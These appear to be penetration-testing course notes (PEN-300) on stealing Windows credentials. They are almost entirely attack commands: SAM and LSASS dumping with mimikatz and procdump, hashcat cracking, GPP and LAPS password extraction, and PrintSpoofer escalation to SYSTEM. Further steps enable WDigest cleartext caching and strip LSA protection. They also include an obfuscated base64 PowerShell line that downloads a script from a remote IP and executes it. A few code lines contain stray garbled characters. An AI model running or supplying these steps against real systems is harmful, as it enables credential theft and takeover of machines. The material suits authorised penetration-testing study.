# PEN-300

#### Local Windows Credentials

## SAM credentials

***theory***: 

Local Windows credentials are stored in the Security Account Manager (SAM) database as password hashes using the NTLM hashing format, which is based on the MD4 algorithm.

We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine.

Although it is rare to find matching local credentials between disparate machines, the built-in default-named Administrator account is installed on all Windows-based machines.  


***Attack***:  

To get local client workstation name and administrator RID.  Follow commands below
```plaintext
$env:computername
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
```
<br>

<img width="857" height="343" alt="image" src="https://github.com/user-attachments/assets/1f7e1521-032f-4e7a-92f6-0f1827ae132d" />



1) Create shadow copy:          wmic shadowcopy call create Volume='C:\'
2) Locate Shadow copy:          vssadmin list shadows
3) Copy SYSTEM / SAM off of host  
4) mimikatz lsadump::sam /system:systemfile /sam:samfile  
   OR
   creddump7: python pwdump.py ~/data/sam/system ~/data/sam/sam  
   <br>
6) Hashcat the password:  

**Mask attack** ./hashcat64.bin -m 1000 -a 3 -w 3 -O hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1?1 -i --increment-min=5
**Password List** .\hashcat.exe -m 1000 -a 0 -w 3 -O hash.txt password_list.txt
<br>

# Hardening the Local Administrator Account

### CPassword  

**Cpassword in the SYSVOL folder on the DC can be viewed with Get-GPPPassword.ps1**  

[Get-GPPPassword.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Exfiltration/Get-GPPPassword.ps1)

<br><br>


### LAPS - Local Administrator Password Solution  

***LAPS Toolkit for LAPS enumeration***

[Laps ToolKit download](https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1)

**Get-LAPSComputers**:  
Displays all computers with LAPS enabled, password expriation, and password if user has access  

**Find-LAPSDelegatedGroups:**  
Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute  

***Could then use PowerView to view members of this group***
ex: Get-NetGroupMember -GroupName "LAPS Password Readers"  

**Find-AdmPwdExtendedRights**  
Parses through ExtendedRights for each AD computer with LAPS enabled and looks for which group has read access and if any user has "All Extended Rights". Sysadmins may not be aware the users with All Extended Rights can view passwords and may be less protected than the users in the delegated groups. An example is the user which adds a computer to the domain automatically receives the "All Extended Rights" permission. Since this function will parse ACLs for each AD computer, this can take very long with a larger domain.  

<br><br>

# Access Tokens  

**the operating system also must keep track of the user's access rights, i.e. authorization. Windows uses access tokens to track these rights**  



### PrintSpooferNet and SpoolSample to go from NT Authority\* to SYSTEM.  Local privilege escalation

On Kali as PrintSpooferNet and SpoolSample under visualStudio folder  

AS 'NT Authority':

1) PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss

ALSO AS 'NT AUTHORITY'

2) SpoolSample.exe appsrv01 appsrv01/pipe/test


<Br>CMD.exe will be spawned (you can make any executable in the last line of the source code for printspoofernet) as SYSTEM.  Enjoy priv esc.  <br>
**"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1AC8AcgB1AG4AbgBlAHIALgBwAHMAMQAnACkAIAB8ACAAaQBlAHgA"**  <br>


>The technique shown in this section is not the only possible way of leveraging impersonation to obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex Ionescu and Yarden Shafir. It impersonates the RPC system service (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for Network Service. <br><br>On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through COM. It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release of the RoguePotato tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access.<br><br>Lastly, the beans technique based on local man-in-the-middle authentication with Windows Remote Management (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default.  


<br><br>

# MIMIKATZ and LSA Protection

**Removal of LSA protection requires mimidrv.sys which may be flagged by AV**  

#### dump all cached passwords and hashes from LSASS

1) privilege::debug  
2) sekurlsa::logonpasswords  
3) Hashes listed under 'NTLM'  


### Wdigest passwords are cleartext.  
> The wdigest authentication protocol requires a clear text password, but it is disabled in Windows 8.1 and newer. We can enable it by creating the UseLogonCredential registry value in the path HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest. Once we set this value to "1", the clear text password will be cached in LSASS after subsequent logins.

```Powershell
Get-ItemPropertyValue -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential

Set-ItemProperty -Path hklm:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Value 1
```

### LSA protection using Protected Processes Light

Check if PPL is running with powershell

```powershellz`
(Get-ItemProperty -Path "HKLM:\SYSTEM\Curz`rentControlSet\Control\Lsa").RunAsPPL

Disable PPL
Set-ItemProperty -Path hklm:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 0
```

**Disable PPL with mimikatz and mimidrv.sys**

1) !+
2) !processprotect /process:lsass.exe /remove
3) sekurlsa::logonpasswords


<br><br>

IF GUI ACCESS:

### Memory Dump from Task Manager

>When opening a dump file in Mimikatz, the target machine and the processing machine must have a matching OS and architecture. For example, if the dumped LSASS process was from a Windows 10 64-bit machine; we must also parse it on a Windows 10 or Windows 2016/2019 64-bit machine. However, processing the dump file requires neither an elevated command prompt nor privilege::debug.

1) TaskManager -> Create Dump File
2) Move dump file to Mimikatz host.
3) Load LSASS dump into Mimikatz memory: sekurlsa::minidump lsass.dmp
4) sekurlsa::logonpasswords

<br><br>
NO GUI ACCESS:

**Alternatively, we can create the dump file from the command line with ProcDump from SysInternals.**

Custom dump memory lsass file:
procdump -ma lsass.exe lsass_dump.dmp

<br><br>

### Custom memory dump with C#



